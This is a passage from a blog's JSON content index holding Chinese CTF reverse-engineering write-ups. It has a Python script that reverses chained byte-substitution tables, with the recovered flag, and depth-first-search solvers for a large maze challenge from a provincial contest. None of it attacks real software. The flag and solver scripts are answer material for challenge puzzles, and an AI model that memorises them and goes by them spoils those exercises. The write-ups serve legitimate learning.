0x89, 0x2A, 0x0F, 0x7E, 0xE1, 0xC8, 0x5F, 0x4E, 0x6D, 0xF6, 0x49, 0xB8, 0x55, 0x60, 0x82, 0x20, 0x36, 0xC1, 0x0C, 0x1B, 0xC4, 0x00, 0xE5, 0xA3, 0x2C, 0xE9, 0xC2, 0xF1, 0x23, 0x3F, 0xC3, 0xB5, 0x8D, 0xD7, 0x42, 0xFC, 0x50, 0x13, 0xBB, 0x61, 0x9A, 0x44, 0xE6, 0x91, 0x2F, 0x70, 0xC6, 0x6F, 0xD1, 0x27, 0x43, 0x08, 0xDA, 0xFD, 0x52, 0x71, 0x77, 0xED, 0xE2, 0xAD, 0x16, 0x8E, 0x12, 0x4C, 0x31, 0x3C, 0x39, 0x78, 0x90, 0xBF, 0x1A, 0x76, 0x75, 0x41, 0x99, 0xD0, 0x80, 0xB7, 0x66, 0x24, 0xD3, 0x7F, 0x4B, 0x45, 0x5C, 0x53, 0x4D, 0x26, 0x32, 0xA0, 0xFB, 0xB3, 0x38, 0x6B, 0xAF, 0xA6, 0xD9, 0x02, 0xA4, 0xEA, 0x6C, 0xAC, 0x58, 0x93]by1380 = [0x91, 0x67, 0x1A, 0xBE, 0xAB, 0xC2, 0x85, 0xD5, 0xDA, 0xCC, 0xF7, 0x5B, 0x54, 0x61, 0x05, 0xDF, 0x02, 0x70, 0x65, 0x69, 0x9A, 0x7A, 0x09, 0x92, 0x5D, 0x2A, 0xA7, 0x37, 0xFF, 0x19, 0xE6, 0x99, 0xF3, 0x1E, 0xBD, 0x82, 0x48, 0x3C, 0xE8, 0xC8, 0x66, 0x17, 0xB7, 0xA9, 0xC5, 0x4E, 0x33, 0x84, 0x45, 0xD3, 0x8B, 0x49, 0x50, 0x43, 0x8F, 0xCD, 0x73, 0x29, 0x04, 0xDC, 0x01, 0x0C, 0xDD, 0x2E, 0xFB, 0x6E, 0x0F, 0x24, 0x57, 0xE9, 0xC9, 0x7D, 0xB3, 0x40, 0x4B, 0x56, 0x6C, 0x68, 0xE2, 0x22, 0xF6, 0x80, 0xAA, 0x95, 0xD4, 0x97, 0x94, 0x21, 0x53, 0xD1, 0xE3, 0x59, 0xD2, 0xED, 0x41, 0x4D, 0x74, 0xA3, 0xA0, 0x32, 0x0D, 0xFC, 0x46, 0x34, 0xFA, 0xB1, 0x5E, 0xC6, 0x71, 0xC0, 0xE0, 0x3F, 0x13, 0x12, 0xD7, 0xEE, 0xF8, 0x26, 0xE1, 0x25, 0x88, 0x77, 0xB0, 0x8D, 0x6A, 0xEA, 0x0E, 0xD6, 0x3E, 0x03, 0x64, 0xBF, 0x8C, 0x96, 0xD9, 0xA4, 0x42, 0xAD, 0xFD, 0x16, 0x5A, 0xE4, 0x06, 0x9D, 0x07, 0x87, 0x5F, 0xAF, 0xDB, 0xC1, 0x93, 0x1C, 0xF1, 0xDE, 0xA6, 0x3A, 0xF4, 0x2C, 0x1B, 0x39, 0xE7, 0x4A, 0xC7, 0x35, 0xFE, 0x0A, 0x62, 0xF0, 0xCA, 0xEC, 0x27, 0x52, 0x23, 0x7F, 0xA5, 0x79, 0x7C, 0x75, 0x86, 0xEB, 0x60, 0xA8, 0xF5, 0x1F, 0x20, 0xC3, 0x63, 0x5C, 0x72, 0x18, 0xE5, 0x51, 0xAC, 0xB9, 0x90, 0x9F, 0x4C, 0xB2, 0xCB, 0x00, 0x6F, 0x28, 0xA1, 0xB6, 0x9B, 0xD0, 0x7B, 0x36, 0x4F, 0x9C, 0xCF, 0x98, 0x8A, 0x0B, 0x78, 0xB4, 0x7E, 0x2B, 0xEF, 0x58, 0xB5, 0xBA, 0x55, 0xB8, 0x10, 0x2F, 0x44, 0xAE, 0x89, 0x08, 0xC4, 0x3B, 0x9E, 0xF9, 0x6D, 0xF2, 0x15, 0x1D, 0x30, 0x47, 0x8E, 0x31, 0x2D, 0xD8, 0x6B, 0x3D, 0x11, 0x14, 0xA2, 0x83, 0xCE, 0xBB, 0x81, 0xBC, 0x76, 0x38]by1780 = [0x38, 0x5A, 0xC7, 0x98, 0x15, 0x6A, 0xC9, 0x28, 0x33, 0xEA, 0xF4, 0xD9, 0xDB, 0x77, 0xB8, 0x49, 0x1B, 0x79, 0xF5, 0xFD, 0x3E, 0xA2, 0xDE, 0x17, 0xC4, 0x5E, 0xE5, 0x11, 0xB6, 0x1D, 0x86, 0xF9, 0x90, 0x78, 0x8A, 0x14, 0x12, 0xB1, 0xC2, 0x21, 0xF1, 0x02, 0x58, 0xA1, 0x23, 0x0C, 0xAD, 0xA5, 0x50, 0x48, 0x1E, 0x6D, 0xF8, 0x96, 0x9D, 0x19, 0x00, 0xBD, 0x26, 0xCE, 0xA7, 0x24, 0x2E, 0x39, 0x7B, 0xFA, 0x5F, 0xCC, 0x1A, 0x0B, 0x40, 0x0F, 0x4B, 0x82, 0xE2, 0x97, 0x10, 0x2A, 0xFC, 0x3B, 0xB2, 0x66, 0x27, 0x54, 0x07, 0xE3, 0x08, 0xA3, 0xA6, 0xED, 0x62, 0x13, 0x9C, 0x20, 0x01, 0x92, 0xE8, 0xAE, 0xBE, 0xE1, 0x0A, 0x41, 0x94, 0x80, 0xA9, 0x2F, 0x29, 0x70, 0x35, 0x16, 0xF7, 0x6B, 0xFE, 0x9E, 0x0D, 0xD3, 0x7F, 0x1F, 0xA0, 0x32, 0xD2, 0x52, 0x05, 0x76, 0x89, 0x9B, 0x7A, 0x8F, 0x99, 0xEF, 0xCF, 0x51, 0x0E, 0xEC, 0x59, 0x5C, 0x37, 0xD5, 0x8E, 0x31, 0x34, 0x2D, 0x93, 0x25, 0x1C, 0xC8, 0x5B, 0x47, 0x9F, 0x03, 0x67, 0x7E, 0x42, 0x7D, 0x3A, 0xAA, 0x57, 0xDA, 0x9A, 0xAB, 0x74, 0x72, 0xE4, 0xB7, 0x5D, 0xCD, 0x87, 0x46, 0x2B, 0x43, 0xF3, 0xD0, 0x85, 0x55, 0xBB, 0xD4, 0xC6, 0x61, 0x56, 0x04, 0x65, 0x7C, 0x88, 0xC3, 0x73, 0xBC, 0xEB, 0xDD, 0x4D, 0xE0, 0xE6, 0xC0, 0x63, 0x8D, 0xF2, 0x81, 0xF6, 0xA8, 0x3D, 0x3F, 0xA4, 0xE9, 0x4A, 0xB5, 0xF0, 0xCA, 0x8B, 0x2C, 0xD7, 0xAC, 0xC5, 0xC1, 0xBF, 0x53, 0xD1, 0x6F, 0x06, 0xE7, 0xD6, 0x09, 0x95, 0x44, 0x71, 0xB9, 0x83, 0x4C, 0x22, 0xAF, 0xB4, 0x75, 0x36, 0x30, 0xCB, 0xEE, 0x91, 0x45, 0x8C, 0x4E, 0x6E, 0x6C, 0x4F, 0x84, 0xBA, 0xFF, 0x64, 0xB3, 0x60, 0xFB, 0xB0, 0x18, 0xD8, 0xDF, 0x3C, 0x68, 0xDC, 0x69]by1d80 = [0xD1, 0x9C, 0x68, 0xC0, 0x13, 0xAC, 0x48, 0x32, 0xA3, 0xBA, 0x4C, 0xE7, 0x6D, 0xC8, 0x1C, 0xAB, 0xE2, 0x7A, 0x42, 0xE1, 0x7B, 0x16, 0x67, 0x03, 0xAE, 0x7E, 0xAA, 0x38, 0x22, 0x02, 0x39, 0x51, 0xC7, 0x79, 0xD7, 0xCB, 0xEF, 0x62, 0x98, 0xDC, 0x53, 0x72, 0x89, 0xA5, 0x4B, 0xC6, 0x86, 0xF6, 0xFC, 0x77, 0x5A, 0xF5, 0x2E, 0x3D, 0xB2, 0xFE, 0x59, 0x27, 0x80, 0x63, 0xDD, 0x1A, 0x12, 0x5E, 0xED, 0xB0, 0xBC, 0xC4, 0x5F, 0x11, 0xC9, 0x09, 0xC5, 0x75, 0x96, 0x0A, 0x2F, 0x00, 0x17, 0x81, 0x14, 0x47, 0xBB, 0x9D, 0x8E, 0x3C, 0xD6, 0xA1, 0xE0, 0xA2, 0x26, 0x5D, 0x08, 0x6E, 0x4E, 0xF1, 0xCF, 0x73, 0x8A, 0x90, 0x0B, 0xB3, 0x3E, 0xB6, 0x1F, 0xC3, 0xB7, 0xDA, 0x8D, 0x05, 0xEE, 0x18, 0x93, 0x3A, 0x6A, 0x8C, 0x43, 0x8F, 0xEB, 0xE9, 0x5B, 0x29, 0x37, 0x1E, 0x46, 0x33, 0x31, 0xFB, 0x35, 0x34, 0x61, 0x04, 0x0E, 0x2B, 0x74, 0xF9, 0x8B, 0x2C, 0x20, 0x0C, 0x7C, 0x28, 0x5C, 0xCA, 0xE6, 0x6B, 0xD8, 0x30, 0xE4, 0x21, 0x44, 0x70, 0x06, 0xA6, 0x60, 0x41, 0x84, 0x10, 0x95, 0x4F, 0x64, 0x83, 0xD2, 0x9A, 0xBE, 0xAF, 0x9F, 0x07, 0xC1, 0xB8, 0x3B, 0x65, 0xCC, 0x57, 0xB5, 0xD9, 0x92, 0xDE, 0x0D, 0xE3, 0xF3, 0xA4, 0xBD, 0x6F, 0xD3, 0x25, 0x88, 0x71, 0xFF, 0xA9, 0x36, 0xB1, 0x78, 0x24, 0x69, 0xAD, 0x19, 0xBF, 0xFD, 0xCD, 0x4A, 0xEA, 0x87, 0x91, 0xA8, 0x66, 0x82, 0x50, 0x0F, 0x99, 0x45, 0xF2, 0xD5, 0x9B, 0x94, 0x7D, 0xCE, 0xDB, 0xB9, 0x52, 0xE5, 0xF4, 0x01, 0x7F, 0xD4, 0x15, 0x2D, 0x3F, 0x1D, 0xA7, 0xC2, 0xFA, 0x40, 0xE8, 0xA0, 0x55, 0x6C, 0xF7, 0x1B, 0x58, 0x85, 0x56, 0x9E, 0xEC, 0x97, 0x23, 0xF0, 0x4D, 0xD0, 0xF8, 0x2A, 0x49, 0xB4, 0x76, 0x54, 0xDF]def fun2(): for i in range(1,len(flag)-1): for j in range(len(by280)): if flag[i] == by280[j]: flag[i] = j breakdef fun3(): for i in range(1,len(flag)-1): for j in range(len(by380)): if flag[i] == by380[j]: flag[i] = j breakdef fun5(): for i in range(1,len(flag)-1): for j in range(len(by580)): if flag[i] == by580[j]: flag[i] = j breakdef fun7(): for i in range(1,len(flag)-1): for j in range(len(by780)): if flag[i] == by780[j]: flag[i] = j breakdef funb(): for i in range(1,len(flag)-1): for j in range(len(byb80)): if flag[i] == byb80[j]: flag[i] = j breakdef fund(): for i in range(1,len(flag)-1): for j in range(len(byd80)): if flag[i] == byd80[j]: flag[i] = j break def fun11(): for i in range(1,len(flag)-1): for j in range(len(by1180)): if flag[i] == by1180[j]: flag[i] = j break def fun13(): for i in range(1,len(flag)-1): for j in range(len(by1380)): if flag[i] == by1380[j]: flag[i] = j break def fun17(): for i in range(1,len(flag)-1): for j in range(len(by1780)): if flag[i] == by1780[j]: flag[i] = j breakdef fun1d(): for i in range(1,len(flag)-1): for j in range(len(by1d80)): if flag[i] == by1d80[j]: flag[i] = j breakfun1d()fun17()fun13()fun11()fund()funb()fun7()fun5()fun3()fun2()print(bytearray(flag))index = [&#x27;2&#x27;, &#x27;3&#x27;, &#x27;5&#x27;, &#x27;7&#x27;, &#x27;b&#x27;, &#x27;d&#x27;, &#x27;11&#x27;, &#x27;13&#x27;, &#x27;17&#x27;, &#x27;1d&#x27;]# #y0u_4r3_7h3_m4573r_0f_r3v3r51n6_! &#x3D;&#x3D;然后这里注意的是flag[i] &#x3D; j后一定要加break，不然会无，然后第二段数据有多解，在移位操作处加&amp;0xfffffff,比如((a1[12] &lt;&lt; 6)&amp;0xffffffff)，这样才算和c代码成功转换&#x3D;&#x3D;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"安徽省赛","slug":"安徽省赛","date":"2022-11-21T06:13:57.000Z","updated":"2022-11-29T08:53:10.582Z","comments":true,"path":"2022/11/21/安徽省赛/","link":"","permalink":"https://pa1r0t.github.io/2022/11/21/%E5%AE%89%E5%BE%BD%E7%9C%81%E8%B5%9B/","excerpt":"安徽省赛只有一个小时，我吐了，脚本都来不及写。。。。赛后才把flag搞出来","text":"安徽省赛只有一个小时，我吐了，脚本都来不及写。。。。赛后才把flag搞出来 呃， 我其实也是第一次见这么庞大的迷宫，一共4384个格~~ 这里看见一行66 代码逻辑很简单，这里不做过多介绍 &#x2F;我原先的脚本的思路是走到错的地方再返回，导致效率太低，跑了好久都没跑出来&#x2F; 赛后我还未想好该怎么优化我的深搜算法，所以就进行了一波手工画图。。。。。。。。 图一： 图二： 图三： emmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 然后就根据这个路线，手写路线字符串 以上是我写的，本办法，太菜了，只能这么搞了 ##下面贴上EDI团队的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041map = []data =[map[i*66:i*66+66] for i in range(66)]print(data)usedmap = [[0 for i in range(len(data))] for i in range(len(data)) ]flag=&quot;&quot;def DFS(x,y): global flag if x == 64 and y == 65: print(flag) if data[x+1][y] == 0 and usedmap [x+1][y] == 0: usedmap [x][y] = 1 flag += &#x27;s&#x27; DFS(x+1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x-1][y] == 0 and usedmap [x-1][y] == 0: usedmap [x][y] = 1 flag += &#x27;w&#x27; DFS(x-1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y+1] == 0 and usedmap [x][y+1] == 0: usedmap [x][y] = 1 flag += &#x27;d&#x27; DFS(x,y+1) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y-1] == 0 and usedmap [x][y-1] == 0: usedmap [x][y] = 1 flag += &#x27;a&#x27; DFS(x,y-1) flag = flag[:-1] usedmap [x][y] = 0y=0x=1try: DFS(x,y)except: pass 他们的脚本其实就是只走对的位置，我实在没想到居然效率会快这么多！！！！！！！！！ 后来我参照他们的思路，重新优化了一下我的脚本，可以说在他们的基础上在一次优化了程序的效率 只能说算法实在太重要了！！！！！！！！！！！！！！ 我的代码：1234567891011121314151617181920212223242526272829303132def dfs(v6, v7): global flag if len(flag) &gt; 364: # 这里防止深度过深 return if v6 == 64 and v7 == 65: print(flag) tlag[66 * v6 + v7] = 1 # 标记走过了 if map1[66 * v6 + v7 + 1] == 0 and tlag[66 * v6 + v7+1] == 0: # 这个位置能不能走，有没有走过 flag += &#x27;d&#x27; dfs(v6, v7 + 1) flag = flag[:-1] if map1[66 * (v6+1) + v7] == 0 and tlag[66 * (v6+1) + v7] == 0: flag += &#x27;s&#x27; dfs(v6+1,v7) flag = flag[:-1] if map1[66 * (v6-1) + v7] == 0 and tlag[66 * (v6-1) + v7] == 0: flag += &#x27;w&#x27; dfs(v6-1, v7) flag = flag[:-1] if map1[66 * (v6) + v7 - 1] == 0 and tlag[66 * (v6) + v7-1] == 0: flag += &#x27;a&#x27; dfs(v6, v7 - 1) flag = flag[:-1] # 这里不用将标志去掉，因为这个位置所有方向都走过了都没到终点，那么其他位置到达该位置也无法到达终点，所以懂吧？if __name__ == &quot;__main__&quot;: map1 = [] tlag = [0]*len(map1) flag = &quot;&quot; try: dfs(1, 0) except: pass 至于代码的细节这里直接看注释即可，都已经写好了 总结这里个人的算法功底还有待提升，算法还是要多练，不然明明会做，但是现场做不出来，太难受了！！！","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]}],"categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]}